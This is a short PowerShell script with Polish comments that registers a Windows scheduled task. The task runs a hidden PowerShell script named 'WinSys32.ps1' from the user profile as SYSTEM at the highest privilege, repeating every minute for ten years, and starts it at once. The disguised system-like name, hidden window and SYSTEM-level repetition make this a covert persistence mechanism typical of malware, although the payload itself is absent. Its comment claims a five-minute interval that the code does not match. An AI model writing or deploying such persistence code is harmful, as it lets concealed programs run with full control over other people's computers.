# Parametry
param (
    [string]$TaskName = "sc11"
)

# Ścieżka do Twojego skryptu
$scriptPath = "$Env:USERPROFILE\.scripts\WinSys32.ps1"

# Utwórz Trigger, który uruchamia zadanie co 5 minut
$startTime = (Get-Date).AddMinutes(1)
$trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)


# Utwórz Akcję, która uruchamia PowerShell z Twoim skryptem
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""

# Zarejestruj zadanie w Harmonogramie Zadań
Register-ScheduledTask -TaskName $TaskName -Trigger $trigger -Action $action -RunLevel Highest -User "SYSTEM"

# Uruchom zadanie
Start-ScheduledTask -TaskName $TaskName
